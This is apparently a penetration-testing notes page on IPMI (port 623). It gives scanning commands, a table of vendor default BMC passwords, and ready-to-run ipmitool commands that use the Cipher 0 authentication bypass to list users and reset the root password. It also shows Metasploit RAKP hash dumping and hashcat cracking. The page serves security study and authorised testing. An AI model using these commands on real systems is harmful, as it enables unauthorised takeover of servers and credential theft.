---
title: 623 - Intelligent Platform Management Interface (IPMI)  
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - intelligent platform management interface
  - port 623
  - ipmi
  - bcm
---

# 623 - Intelligent Platform Management Interface (IPMI)

Intelligent Platform Management Interface (IPMI) is a system management tool that provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state.  It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI communicates over port 623 UDP. IPMI is typically used in three ways:

- Before the OS has booted to modify BIOS settings
- When the host is fully powered down
- Access to a host after a system failure



## Footprinting ipmi

Many Baseboard Management Controllers (BMCs) (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.

### Discovery

```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```

### Version

```shell-session
 sudo nmap -sU --script ipmi-version -p 623 <hostname/IP>
```

Metasploit scanner module [IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version)](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/): this module discovers host information through IPMI Channel Auth probes:

```msfc
use auxiliary/scanner/ipmi/ipmi_version

show actions ...actions... msf 
set ACTION < action-name > msf 
show options 
# and set needed options
run
```

We might find BMCs where the administrators have not changed the default password:

|Product|Username|Password|
|---|---|---|
| Dell Remote Access Card (iDRAC, DRAC) |root|calvin|
|HP Integrated Lights Out (iLO)|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI (2.0) |ADMIN|ADMIN|
| IBM Integrated Management Module (IMM) | USERID | PASSW0RD (with a zero) |
| Fujitsu Integrated Remote Management Controller | admin | admin |
| Oracle/Sun Integrated Lights Out Manager (ILOM) | root | changeme |
| ASUS iKVM BMC | admin | admin |

These default passwords may gain us access to the web console or even command line access via SSH or Telnet.

### Vulnerability - IPMI Authentication Bypass via Cipher 0

Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually **allows access with any password**. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations.

```msf
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```

Abuse this flaw with `ipmitool`:

```bash
# Install
apt-get install ipmitool 

# Use Cipher 0 to dump a list of users. With -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H $ip -U root -P root user list 

# Change the password of root
ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 
```

### IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval

If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.

[Metasploit module](metasploit.md):

This module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300. 

```msf
use auxiliary/scanner/ipmi/ipmi_dumphashes

show actions

set ACTION < action-name >

show options
# set <options>

run
```

[Hashcat](hashcat.md): 

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```



## How does IPMI work

IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using [SNMP](161-162-snmp.md). The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.

Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:

- Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
- Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
- Intelligent Platform Management Bus (IPMB) - extends the BMC
- IPMI Memory - stores things such as the system event log, repository store data, and more
- Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus.


**Baseboard Management Controllers (BMCs)**: Systems that use the IPMI protocol.

>BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI.

If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system.

## Resources

- **hacktricks**: [https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)
